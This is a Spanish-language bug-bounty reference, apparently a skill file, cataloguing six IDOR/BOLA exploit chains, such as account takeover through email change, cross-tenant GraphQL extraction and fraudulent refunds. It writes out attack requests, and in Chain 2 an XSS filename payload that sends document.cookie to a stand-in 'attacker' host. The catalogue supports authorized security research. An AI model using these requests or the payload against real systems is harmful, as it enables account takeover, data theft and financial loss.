# IDOR/BOLA — Chain Catalog

**Procedencia:** adaptado de skill público "hunt-idor" (26 reportes públicos H1/GH). IDs de reporte y montos verificados por el operador el 04/08/2026 antes de incorporar a Mulderx. Todo lo de acá es `confirmado (derivado)` salvo que vos lo corras en vivo contra un target propio — en ese caso re-etiquetalo `confirmado (verificado en vivo, técnica externa)` en el finding correspondiente, no acá.

**Patrón operativo:** cuando confirmás un IDOR de lectura, preguntate inmediatamente *¿qué state-change acepta el mismo ID y también podría estar IDOR'd?* La cadena suele ser una de tres: (1) reset de password / cambio de email → ATO, (2) refund/withdraw/transfer → financiero, (3) cambio de rol/membership → privesc. Si tu IDOR de lectura no compone a ninguna de las tres, el payout standalone es lo que vas a cobrar — no fuerces un chain que no está.

---

### Chain 1 — IDOR en cambio de email + sin re-auth → Password Reset → ATO

- **A.** `PUT /api/users/{victim_id}/email {"email":"attacker@evil"}` desde sesión del atacante — el server cambia el email de la víctima sin chequear ownership.
- **B.** Disparás el flujo de password reset sobre la cuenta víctima — el link llega al email **nuevo** (el del atacante).
- **C.** Reset, nueva password, login como víctima.
- **Por qué es silencioso:** el cambio de email vía API no dispara la notificación que sí dispara el flujo de "cambiar email" normal de la UI.
- **Sin skill destino todavía** — no tenés un `ato`/`auth-bypass` skill armado. Queda documentado acá como nota, no como link funcional.

### Chain 2 — IDOR en descarga de archivo + `Content-Disposition` con filename sin sanitizar → XSS reflejado → robo de sesión

- **A.** IDOR en `/api/files/{id}/download` devuelve el archivo de cualquier usuario dado el ID.
- **B.** El endpoint setea `Content-Disposition: attachment; filename="<filename-del-usuario>"` sin sanitizar comillas/newlines — el atacante sube un archivo con filename `"; <script>fetch('https://attacker/x?c='+document.cookie)</script>; foo.txt`.
- **C.** La víctima navega a la descarga → el browser interpreta el script inyectado en el contexto del header de respuesta → exfil de cookie/token.
- **Conecta con tu skill real:** esto es un sink de header-reflejado, no el `innerHTML`/prototype-pollution que ya tenés catalogado en `xss/references/client-side-prototype-pollution.md` — es una clase distinta (response-header XSS), anotalo si te lo cruzás pero no asumas que tu vector-catalog actual ya lo cubre.
- Relevante también para `file-upload` si el target tiene endpoint de descarga con filename controlado.

### Chain 3 — IDOR vía GraphQL `node(id:)` global ID + relaciones anidadas sin re-auth → extracción masiva cross-tenant

- **A.** Target usa GraphQL con global IDs estilo Relay (`gid://shopify/Customer/<n>` o `type:id` en base64).
- **B.** `node(id:"<victim_gid>") { ... on Customer { email orders { totalPrice paymentMethods { cardLast4 } } } }` — el resolver top-level autentica al requester, pero las relaciones anidadas no re-chequean ownership contra el Customer resuelto.
- **C.** Iterás IDs (decodificando base64 para sacar el numérico e incrementando) para exfiltrar emails, totales de orden, métodos de pago de toda la base de clientes.
- **Impacto:** extracción masiva de PII/financiero cross-tenant. Un solo bug, la base entera.
- **Referencia:** Shopify Billing IDOR H1 #2207248 ($5,000); PolicyPageAssetGroup IDOR H1 #1618347 ($25,000).
- **Sin skill destino todavía** — no tenés `graphql` dedicado. Si armás uno, esto migra ahí.

### Chain 4 — IDOR en `/api/teams/{id}/members` + mass assignment en el body → escalación de rol en team ajeno

- **A.** IDOR horizontal estándar — `POST /api/teams/{victim_team_id}/members {"email":"attacker@evil"}` te agrega como miembro normal sin chequeo de ownership.
- **B.** El body acepta campos extra que la API no filtra: `{"email":"attacker@evil", "role":"OWNER", "permissions":["*"]}` — mass assignment se filtra al campo de rol.
- **C.** El atacante queda agregado al team víctima como OWNER. Acceso admin completo, puede remover a los owners reales.
- **Referencia:** Shopify `fileCopy` mutation H1 #981472 (2020, $2,000); Stripe `UpdateAtlasApplicationPerson` H1 #1066203 (2020).
- **Sin skill destino todavía** — mass assignment no tiene skill propio en Mulderx. Nota para vos: esto es candidato a un futuro skill de `business-logic` o `api-misconfig`, no lo fuerces dentro de idor-bola cuando lo armes.

### Chain 5 — Soft-delete IDOR + token sigue válido post-remoción → acceso cross-tenant persistente

- **A.** El endpoint de "remover miembro" solo flipea `active=false` pero no invalida sesión/PAT.
- **B.** Capturás el token del usuario antes de que lo remuevan.
- **C.** El admin lo remueve por el flujo normal. El token capturado sigue funcionando — el IDOR es temporal (la policy dice que no tiene permiso, pero el contexto de auth cacheado sigue pasando).
- **Impacto:** semanas de acceso cross-tenant post-terminación; exposición GDPR/CCPA; potencial de extorsión.
- **Sin skill destino todavía.**

### Chain 6 — Doble IDOR (`/users/{id}/orders` → `/orders/{order_id}/refund`) → impacto financiero directo

- **A.** Primer IDOR: `GET /api/users/{victim_id}/orders` devuelve la lista de órdenes de la víctima sin chequeo de ownership — te da `order_id` legítimos.
- **B.** Segundo IDOR: `POST /api/orders/{order_id}/refund` emite refunds sin chequear que el requester sea dueño del merchant/orden.
- **C.** Disparás refund sobre cada orden reciente del merchant víctima. La plata se mueve del merchant al customer (controlado por el atacante).
- **Impacto:** pérdida financiera directa, mass-explotable en toda la base de merchants de la plataforma.
- **Sin skill destino todavía** — candidato a `business-logic` si lo armás después.

---

## Nota de calibración

Ningún chain de este catálogo reemplaza el Gate 0 del SKILL.md. Un chain teórico ("podría componer con esto") no es un finding — cada eslabón (A, B, C) necesita su propio request confirmado antes de reportar la cadena completa. Si solo confirmaste A, reportás A con la severidad de A, no la severidad del chain completo.
